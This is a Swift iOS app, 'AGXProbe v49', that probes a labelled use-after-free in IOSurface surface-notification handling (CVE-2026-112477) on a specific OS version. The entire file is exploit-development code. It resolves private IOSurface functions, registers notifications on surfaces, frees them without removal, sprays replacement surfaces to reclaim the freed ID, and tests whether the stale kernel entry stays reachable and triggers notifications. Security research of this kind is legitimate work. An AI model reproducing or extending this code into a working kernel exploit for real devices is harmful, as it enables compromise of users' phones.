import SwiftUI
import Darwin
import CoreFoundation

@main
struct AGXProbeApp: App {
    var body: some Scene { WindowGroup { ContentView() } }
}

struct ContentView: View {
    @StateObject private var vm = ReachViewModel()
    var body: some View {
        VStack(spacing: 12) {
            Text("AGXProbe v49 - IOSurface notify UAF (CVE-2026-112477)").font(.headline)
            Text("sel 0x11/0x12 - live on 27.0.1 - fixed in 27.2").font(.caption2).foregroundColor(.secondary)
            ScrollView {
                Text(vm.log)
                    .font(.system(size: 9, design: .monospaced))
                    .foregroundColor(.green)
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .padding(6).background(Color.black.opacity(0.85)).cornerRadius(6)
            }
            Button(action: { Task { await vm.runProbe() } }) {
                Text(vm.isRunning ? "Probing..." : "Run v49")
                    .font(.headline).foregroundColor(.white)
                    .frame(maxWidth: .infinity).padding(10)
                    .background(vm.isRunning ? Color.gray : Color.blue).cornerRadius(8)
            }.disabled(vm.isRunning)
            Text("Status: \(vm.status)").font(.caption2).foregroundColor(.secondary)
            Spacer(minLength: 0)
        }
        .padding().task { await vm.autoRunIfRequested() }
    }
}

@MainActor
final class ReachViewModel: ObservableObject {
    @Published var log = ""
    @Published var status = "Ready"
    @Published var isRunning = false
    private var didAutoRun = false

    private let logFileURL: URL = {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("reach.log")
    }()

    private func emit(_ m: String) {
        log += m + "\n"; print(m); fflush(stdout)
        try? log.write(to: logFileURL, atomically: true, encoding: .utf8)
    }

    func autoRunIfRequested() async {
        guard !didAutoRun else { return }
        didAutoRun = true
        if ProcessInfo.processInfo.arguments.contains("--autorun") { await runProbe() }
    }

    // MARK: - IOSurface notify handles

    typealias CreateFn = @convention(c) (CFDictionary) -> UnsafeMutableRawPointer?
    typealias GetIDFn = @convention(c) (UnsafeMutableRawPointer) -> UInt32
    typealias SetNotifyFn = @convention(c) (mach_port_t, UInt64, UInt64) -> kern_return_t
    typealias RemoveNotifyFn = @convention(c) (UInt64) -> kern_return_t

    private var gSet: SetNotifyFn?
    private var gRemove: RemoveNotifyFn?
    private var gCreate: CreateFn?
    private var gGetID: GetIDFn?
    private var gPort: mach_port_t = 0

    private func loadSymbols() -> Bool {
        guard let handle = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY) else {
            emit("[NO] dlopen failed"); return false
        }
        defer { dlclose(handle) }
        guard let cs = dlsym(handle, "IOSurfaceCreate"),
              let isym = dlsym(handle, "IOSurfaceGetID"),
              let ss = dlsym(handle, "IOSurfaceClientSetSurfaceNotify"),
              let rs = dlsym(handle, "IOSurfaceClientRemoveSurfaceNotify") else {
            emit("[NO] symbol missing"); return false
        }
        gCreate = unsafeBitCast(cs, to: CreateFn.self)
        gGetID = unsafeBitCast(isym, to: GetIDFn.self)
        gSet = unsafeBitCast(ss, to: SetNotifyFn.self)
        gRemove = unsafeBitCast(rs, to: RemoveNotifyFn.self)
        emit("     IOSurfaceCreate @ \(UInt(bitPattern: cs))")
        emit("     IOSurfaceGetID @ \(UInt(bitPattern: isym))")
        emit("     IOSurfaceClientSetSurfaceNotify @ \(UInt(bitPattern: ss))")
        emit("     IOSurfaceClientRemoveSurfaceNotify @ \(UInt(bitPattern: rs))")
        return true
    }

    private func makeSurface(w: Int = 256, h: Int = 256, bpe: Int = 4) -> UnsafeMutableRawPointer? {
        guard let gCreate else { return nil }
        let propsAny: [String: Any] = ["IOSurfaceWidth": w, "IOSurfaceHeight": h,
                                       "IOSurfaceBytesPerElement": bpe]
        return gCreate(propsAny as CFDictionary)
    }

    private func sid(_ s: UnsafeMutableRawPointer) -> UInt64 {
        UInt64(gGetID!(s))
    }

    private func releaseSurface(_ s: UnsafeMutableRawPointer) {
        Unmanaged<AnyObject>.fromOpaque(s).release()
    }

    private func krstr(_ kr: kern_return_t) -> String {
        let u = UInt32(bitPattern: kr)
        var tag = ""
        switch u {
        case 0: tag = " SUCCESS"
        case 0xe00002c2: tag = " BadArgument"
        case 0xe00002c1: tag = " NotPrivileged"
        case 0xe00002c9: tag = " InternalError/already-registered"
        case 0xe00002bd: tag = " 0x2bd"
        case 0xe00002d8: tag = " NotAttached(27.2-guard)"
        default: tag = ""
        }
        return "0x\(String(u, radix: 16))\(tag)"
    }

    // MARK: - experiments

    private func baseline() {
        emit("\n=== 1 - baseline set/remove on a live surface ===")
        guard let s = makeSurface() else { emit("[NO] create failed"); return }
        let id = sid(s)
        emit("     surface id = 0x\(String(id, radix: 16))")
        emit("     set(port,1,id)  -> \(krstr(gSet!(gPort, 1, id)))")
        emit("     set again       -> \(krstr(gSet!(gPort, 1, id)))")
        emit("     remove(id)      -> \(krstr(gRemove!(id)))")
        emit("     remove again    -> \(krstr(gRemove!(id)))")
        releaseSurface(s)
        emit("     released")
    }

    /// Core experiment: register, drop the surface, then look for the stale entry.
    private func phaseA(spray: Int, tag: String) {
        emit("\n=== phase A [\(tag)] spray=\(spray) ===")
        guard let a = makeSurface() else { emit("[NO] create failed"); return }
        let id = sid(a)
        let r1 = gSet!(gPort, 1, id)
        emit("     [A] surface 0x\(String(id, radix: 16))  set -> \(krstr(r1))")
        releaseSurface(a)
        emit("     [A] released without remove")

        var kept: [UnsafeMutableRawPointer] = []
        var reused = -1
        for i in 0..<spray {
            guard let s2 = makeSurface() else { break }
            kept.append(s2)
            if sid(s2) == id { reused = i }
        }
        emit("     sprayed \(kept.count) surfaces; id 0x\(String(id, radix: 16)) reused at index \(reused)")

        let rs = gSet!(gPort, 1, id)
        emit("     [B] set(stale id)  -> \(krstr(rs))")
        let rr = gRemove!(id)
        emit("     [B] remove(stale)  -> \(krstr(rr))")
        let rs2 = gSet!(gPort, 1, id)
        emit("     [B] set again      -> \(krstr(rs2))")
        let rr2 = gRemove!(id)
        emit("     [B] remove again   -> \(krstr(rr2))")

        for k in kept { releaseSurface(k) }
    }

    /// Is the stale entry stable under repeated touching? (UAF stability check)
    private func stability() {
        emit("\n=== 2 - stale-entry stability (UAF reachability) ===")
        guard let a = makeSurface() else { return }
        let id = sid(a)
        _ = gSet!(gPort, 1, id)
        releaseSurface(a)
        var kept: [UnsafeMutableRawPointer] = []
        for _ in 0..<64 { if let s = makeSurface() { kept.append(s) } }
        emit("     released 0x\(String(id, radix: 16)) then sprayed \(kept.count)")
        var counts: [UInt32: Int] = [:]
        for _ in 0..<40 {
            let kr = UInt32(bitPattern: gSet!(gPort, 1, id))
            counts[kr, default: 0] += 1
        }
        for (k, v) in counts.sorted(by: { $0.key < $1.key }) {
            emit("     set x40 -> kr 0x\(String(k, radix: 16)) count \(v)")
        }
        emit("     remove -> \(krstr(gRemove!(id)))")
        for k in kept { releaseSurface(k) }
    }

    /// Does a notification actually fire, and what does the message look like?
    private func notifyFires() {
        emit("\n=== 3 - does the notify callback fire? (walk trigger) ===")
        guard let s = makeSurface() else { return }
        let id = sid(s)
        let r = gSet!(gPort, 1, id)
        emit("     set -> \(krstr(r))")

        guard let handle = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW) else { return }
        typealias SetValueFn = @convention(c) (UnsafeMutableRawPointer, CFString, CFTypeRef) -> kern_return_t
        if let sv = dlsym(handle, "IOSurfaceSetValue") {
            let setValue = unsafeBitCast(sv, to: SetValueFn.self)
            let key = CFStringCreateWithCString(nil, "AGXProbeKey", CFStringBuiltInEncodings.UTF8.rawValue)
            let val = CFStringCreateWithCString(nil, "AGXProbeVal", CFStringBuiltInEncodings.UTF8.rawValue)
            let skr = setValue(s, key!, val!)
            emit("     IOSurfaceSetValue -> \(krstr(skr))")
        } else {
            emit("     IOSurfaceSetValue symbol missing")
        }

        var m = mach_msg_header_t()
        let mkr = mach_msg(&m, MACH_RCV_TIMEOUT, 0, gPort, UInt32(300), mach_port_t(0), 0)
        emit("     mach_msg recv -> \(krstr(mkr)) msglen=\(m.msgh_size) msgid=0x\(String(m.msgh_id, radix: 16))")
        if mkr == 0 {
            emit("     *** NOTIFICATION DELIVERED ***")
        }

        emit("     remove -> \(krstr(gRemove!(id)))")
        releaseSurface(s)
    }

    func runProbe() async {
        isRunning = true; status = "Probing..."; log = ""
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
        emit("=== AGXProbe v49 - IOSurface notify UAF (CVE-2026-112477) ===")
        emit("kernel dispatch: sel 0x11 sIn=0 stIn=0x18 | sel 0x12 sIn=0 stIn=0x18")

        guard loadSymbols() else { emit("=== failed ==="); status = "Failed"; isRunning = false; return }

        let pkr = mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &gPort)
        emit("     notify port 0x\(String(gPort, radix: 16)) kr=0x\(String(UInt32(bitPattern: pkr), radix: 16))")
        if pkr != KERN_SUCCESS { emit("=== failed ==="); status = "Failed"; isRunning = false; return }

        baseline()
        phaseA(spray: 0, tag: "no-spray")
        phaseA(spray: 1, tag: "one")
        phaseA(spray: 8, tag: "eight")
        phaseA(spray: 64, tag: "sixtyfour")
        stability()
        notifyFires()

        emit("\n=== done ===")
        status = "Complete"; isRunning = false
    }
}
